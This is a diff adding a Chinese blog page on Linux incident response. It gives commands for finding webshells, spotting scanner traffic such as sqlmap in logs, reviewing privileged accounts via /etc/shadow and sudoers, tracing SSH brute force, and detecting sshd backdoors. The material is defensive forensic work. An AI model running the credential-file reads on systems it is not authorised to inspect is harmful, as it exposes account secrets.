@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" /><meta name="theme-color" content="#fff" />
+
+    
+        
+        
+        <script>
+            if (window.location.host == "www.yingyingguaier.top" && window.location.protocol != "https:") {
+                window.location.protocol = "https";
+            }
+        </script>
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    
+    <meta name="renderer" content="webkit" />
+
+    <meta name="generator" content="Hugo 0.60.1" />
+
+    <title>应急响应 | 柠萌C×篝火</title>
+
+    <link rel="stylesheet" href="/css/meme.min.f217594b2f7c00d93e5d9715a54f552875743a60d7b879b784b739465ad735b0.css" integrity="sha256-8hdZSy98ANk+XZcVpU9VKHV0OmDXuHm3hLc5RlrXNbA=" data-instant-track />
+
+    <link href="https://fonts.googleapis.com/css?family=EB+Garamond|Long+Cang|Noto+Serif+SC|Shadows+Into+Light|ZCOOL+XiaoWei&display=swap&subset=chinese-simplified" rel="stylesheet" />
+
+    <meta name="author" content="0menc" />
+    
+    
+    <meta name="description" content="0x01 Web服务 检测最近创建的文件和上传目录 1 2 3 4 5 6 7 #查找24小时内被修改的php……" />
+    <meta name="keywords" content="应急响应, others" />
+    
+    <link rel="shortcut icon" type="image/ico" href="/favicon.ico" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="柠萌C×篝火" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="柠萌C×篝火" />
+    <meta name="msapplication-starturl" content="../../" />
+    <meta name="msapplication-TileColor" content="#fff" />
+    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+    
+    
+
+    
+    <link rel="canonical" href="https://www.yingyingguaier.top/others/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%95%B4%E7%90%86/" />
+
+
+
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2019-04-21T17:37:15+08:00",
+        "dateModified": "2020-01-30T13:48:00+08:00",
+        "url": "https://www.yingyingguaier.top/others/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%95%B4%E7%90%86/",
+        "headline": "应急响应",
+        "description": "0x01 Web服务 检测最近创建的文件和上传目录 1 2 3 4 5 6 7 #查找24小时内被修改的php……",
+        "keywords": "应急响应, others",
+        "inLanguage" : "zh-CN",
+        "articleSection": "Others",
+        "wordCount":  3908 ,
+        "image": "https://www.yingyingguaier.top/icons/apple-touch-icon.png",
+        "author": {
+            "@type": "Person",
+            "description": "motto",
+            "email": "fastmast.fm@gmail.com",
+            "image": "https://www.yingyingguaier.top/icons/apple-touch-icon.png",
+            "url": "https://www.yingyingguaier.top/",
+            "name": "0menc"
+        },
+        "license": "在保留本文作者及本文链接的前提下，非商业用途随意转载分享。",
+        "publisher": {
+            "@type": "Organization",
+            "name": "柠萌C×篝火",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://www.yingyingguaier.top/icons/apple-touch-icon.png"
+            },
+            "url": "https://www.yingyingguaier.top/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://www.yingyingguaier.top/"
+        }
+    }
+</script>
+
+    
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:site" content="@0menc" />
+<meta name="twitter:creator" content="@0menc" />
+
+    
+
+
+
+
+
+
+<meta property="og:title" content="应急响应" />
+<meta property="og:description" content="0x01 Web服务 检测最近创建的文件和上传目录 1 2 3 4 5 6 7 #查找24小时内被修改的php……" />
+<meta property="og:url" content="https://www.yingyingguaier.top/others/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%95%B4%E7%90%86/" />
+<meta property="og:site_name" content="柠萌C×篝火" />
+<meta property="og:locale" content="zh-CN" /><meta property="og:image" content="https://www.yingyingguaier.top/icons/apple-touch-icon.png" />
+    <meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2019-04-21T17:37:15+08:00" />
+    <meta property="article:modified_time" content="2020-01-30T13:48:00+08:00" />
+    
+    <meta property="article:section" content="Others" />
+    <meta property="article:tag" content="应急响应, others" />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', '');
+    </script>
+
+
+
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        <div class="site-brand">
+            
+            <a href="/" class="brand">柠萌C×篝火</a>
+            
+        </div>
+    </header>
+
+
+            
+    <nav class="nav">
+        <ul class="menu" id="menu">
+            
+                
+            
+            
+            
+                <li class="menu-item"><a href="/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon menu-item-icon"><path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/></svg><span class="menu-item-name">首页</span></a>
+                </li>
+            
+                <li class="menu-item active"><a href="/others/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon menu-item-icon"><path d="M32 448c0 17.7 14.3 32 32 32h384c17.7 0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6 0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3 0 64v48c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"/></svg><span class="menu-item-name">文章</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/categories/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon menu-item-icon"><path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 240v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm32-240v80c0 13.255 10.745 24 24 24H488c13.255 0 24-10.745 24-24V56c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24zm-32 80V56c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm-205.334 56H24c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24zM0 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H24c-13.255 0-24 10.745-24 24zm386.667-56H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zm0 160H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zM181.333 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24z"/></svg><span class="menu-item-name">分类</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/tags/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="icon menu-item-icon"><path d="M497.941 225.941L286.059 14.059A48 48 0 0 0 252.118 0H48C21.49 0 0 21.49 0 48v204.118a48 48 0 0 0 14.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882 0l204.118-204.118c18.745-18.745 18.745-49.137 0-67.882zM112 160c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882 0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397 0h48.721a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882z"/></svg><span class="menu-item-name">标签</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/about/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon menu-item-icon"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6 0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7 0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4 0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9 14.3 0 28-2.7 40.9-6.9 2.3-.7 4.7-1.1 7.1-1.1 42.9 0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z"/></svg><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        </ul>
+    </nav>
+
+            
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        <article class="content post" data-align="justify" data-type="Others">
+
+            <h1 class="post-title">应急响应</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2019-04-21T17:37:15+08:00" class="post-meta-item published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2019-04-21</time>
+    
+    
+    
+    
+        
+        
+            
+            
+                
+                
+                
+                
+                    
+                    
+                    
+                        
+                            
+                            
+                        
+                    
+                
+            
+            
+            
+                
+                <span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href="/others/" class="category-link">Others</a></span>
+            
+        
+        
+    
+    
+        
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;3908</span>
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;8&nbsp;分钟</span>
+    
+    
+</div>
+            
+
+            <div class="post-body"><h1 id="0x01-web"><a href="#0x01-web" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x01 Web服务</h1>
+<ol>
+<li>检测最近创建的文件和上传目录</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1">#查找24小时内被修改的php文件</span>
+find ./ -mtime <span class="m">0</span> -name <span class="s2">&#34;*.php&#34;</span>
+<span class="c1"># n+1天前</span>
+find ./ -mtime +n -name <span class="s2">&#34;*.php&#34;</span> 
+<span class="c1"># n天内</span>
+find ./ -mtime -n -name <span class="s2">&#34;*.php&#34;</span>
+<span class="c1">#具体还有 atime ctime</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>与测试环境目录做对比</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">diff -r <span class="o">{</span>生产dir<span class="o">}</span> <span class="o">{</span>测试dir<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>使用Webshell查杀工具</li>
+</ol>
+<p>Windows下D盾等，Linux下河马等。</p>
+<ol start="4">
+<li>创建Audit审计规则</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">vim /etc/audit/audit.rules
+-a exclude,always -F <span class="nv">msgtype</span><span class="o">=</span>CONFIG_CHANGE
+-a exit,always -F <span class="nv">arch</span><span class="o">=</span>b64 -F <span class="nv">uid</span><span class="o">=</span><span class="m">48</span> -S execve -k webshell
+</code></pre></td></tr></table>
+</div>
+</div><p>1）扫描特征</p>
+<p>通常入侵行为会伴随着踩点和扫描行为，那么可以查一下具有扫描行为的日志。</p>
+<p>例如使用AWVS扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s1">&#39;acunetix&#39;</span> /var/log/httpd/access_log
+</code></pre></td></tr></table>
+</div>
+</div><p>例如使用sqlmap，但是没有使用–random-agent，UA中带有sqlmap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s1">&#39;sqlmap&#39;</span> /var/log/httpd/access_log
+</code></pre></td></tr></table>
+</div>
+</div><p>2）孤立页面</p>
+<p>referer为 – 的php页面</p>
+<p>3）Content-Length</p>
+<p>攻击者打包回传，过滤Content-Length大于5M的日志</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">awk <span class="s1">&#39;{if($10&gt;5000000){print $0}}&#39;</span> /var/log/httpd/access_log
+</code></pre></td></tr></table>
+</div>
+</div><p>需要注意这里如果发现疑似Webshell文件，先用stat记录下时间点，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</p>
+<h1 id="0x02-ssh"><a href="#0x02-ssh" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x02 SSH服务</h1>
+<ol>
+<li>系统账号情况</li>
+</ol>
+<ol>
+<li>查看特权用户</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">awk -F: <span class="s1">&#39;$3==0{print $1}&#39;</span> /etc/passwd
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>查看可以远程登录的帐号信息</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">awk <span class="s1">&#39;/\$1|\$6/{print $1}&#39;</span> /etc/shadow
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>sudo权限权限用户，非必须可删除</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;</span><span class="s2">^#\|^</span>$<span class="s2">&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ALL=(ALL)&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>2）登录情况</p>
+<ol>
+<li>查看失败次数</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep -o <span class="s2">&#34;Failed password&#34;</span> /var/log/secure<span class="p">|</span>uniq -c
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>输出登录爆破的第一行和最后一行，确认爆破时间范围</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s2">&#34;Failed password&#34;</span> /var/log/secure<span class="p">|</span>head -1
+grep <span class="s2">&#34;Failed password&#34;</span> /var/log/secure<span class="p">|</span>tail -1
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>定位爆破ip</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s2">&#34;Failed password&#34;</span> /var/log/secure<span class="p">|</span>grep -E -o <span class="s2">&#34;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&#34;</span><span class="p">|</span>uniq -c <span class="p">|</span> sort -nr
+</code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>查看爆破用户名字典</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s2">&#34;Failed password&#34;</span> /var/log/secure<span class="p">|</span> perl -e <span class="s1">&#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1\n&#34;;}&#39;</span> <span class="p">|</span>uniq -c<span class="p">|</span>sort -nr
+</code></pre></td></tr></table>
+</div>
+</div><ol start="5">
+<li>登录成功：</li>
+</ol>
+<p>登录成功的日期、用户名、IP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s2">&#34;Accepted &#34;</span> /var/log/secure <span class="p">|</span> awk <span class="s1">&#39;{print $1,$2,$3,$9,$11}&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​			登录成功的IP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s1">&#39;Accepted&#39;</span> /var/log/secure <span class="p">|</span> awk <span class="s1">&#39;{print $11}&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr
+</code></pre></td></tr></table>
+</div>
+</div><p>​			或者last，它会读取位于/var/log/wtmp的文件。</p>
+<ol start="6">
+<li>登录失败：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">grep <span class="s1">&#39;Failed&#39;</span> /var/log/secure <span class="p">|</span> awk <span class="s1">&#39;{print $11}&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr
+</code></pre></td></tr></table>
+</div>
+</div><p>或者lastb，会读取位于/var/log/btmp的文件</p>
+<p>3）检查SSH后门方式：</p>
+<ol>
+<li>比对ssh的版本</li>
+</ol>
+<pre><code>ssh -V
+</code></pre><ol start="2">
+<li>查看ssh配置文件和/usr/sbin/sshd的时间</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">stat /etc/ssh/sshd_config
+stat /usr/sbin/sshd
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>strings检查/usr/sbin/sshd，看是否有邮箱信息</li>
+</ol>
+<p>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">strings /usr/sbin/sshd
+</code></pre></td></tr></table>
+</div>
+</div><p>可以查看到邮箱信息。</p>
+<ol start="4">
+<li>通过strace监控sshd进程读写文件的操作</li>
+</ol>
+<p>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">ps axu <span class="p">|</span> grep sshd <span class="p">|</span> grep -v grep
+
+root <span class="m">65530</span> 0.0 0.1 <span class="m">48428</span> <span class="m">1260</span> ? Ss 13:43 0:00 /usr/sbin/sshd
+
+strace -o aa -ff -p <span class="m">65530</span>
+
+grep open aa* <span class="p">|</span> grep -v -e No -e null -e denied<span class="p">|</span> grep WR
+
+aa.102586:open<span class="o">(</span><span class="s2">&#34;/tmp/ilog&#34;</span>, O_WRONLY<span class="p">|</span>O_CREAT<span class="p">|</span>O_APPEND, 0666<span class="o">)</span> <span class="o">=</span> <span class="m">4</span>
+</code></pre></td></tr></table>
+</div>
